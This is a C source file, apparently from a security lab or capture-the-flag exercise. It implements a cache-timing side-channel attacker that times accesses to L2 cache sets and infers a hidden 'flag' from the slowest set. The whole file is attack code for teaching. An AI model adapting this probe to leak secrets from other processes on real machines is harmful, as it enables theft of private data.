// attacker.c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>   // for sleep()
#include "util.h"     // for get_buffer(), rdtscp64()

#define NUM_SETS 2048          // Number of L2 cache sets (for Skylake)
#define CACHE_LINE_SIZE 64     // 64 Bytes per cache line
#define SAMPLE_COUNT 5000      // Take more samples for higher accuracy

// Probe one address mapped to a specific set
uint64_t probe_address(uint8_t *buffer, int set_index) {
    volatile uint8_t *addr;
    uint64_t start, end;
    
    addr = buffer + (set_index * CACHE_LINE_SIZE);  // offset to match cache line
    lfence();  // serialize
    start = rdtscp64();
    *addr;     // memory access
    lfence();
    end = rdtscp64();
    
    return end - start;
}

int main() {
    uint8_t *buffer = get_buffer();  // allocate hugepage buffer
    if (buffer == NULL) {
        printf("Failed to allocate buffer.\n");
        return 1;
    }

    printf("Attacker started.\n");

    uint64_t times[NUM_SETS];  // store cumulative latencies

    // Initialize times
    for (int i = 0; i < NUM_SETS; i++) {
        times[i] = 0;
    }

    // Repeated sampling to smooth noise
    for (int s = 0; s < SAMPLE_COUNT; s++) {
        for (int set = 0; set < NUM_SETS; set++) {
            times[set] += probe_address(buffer, set);
        }
    }

    // Find the set with the maximum access time
    int flag_guess = -1;
    uint64_t max_latency = 0;
    for (int set = 0; set < NUM_SETS; set++) {
        if (times[set] > max_latency) {
            max_latency = times[set];
            flag_guess = set;
        }
    }

    printf("\nFinal Guessed Flag: %d\n", flag_guess);

    return 0;
}
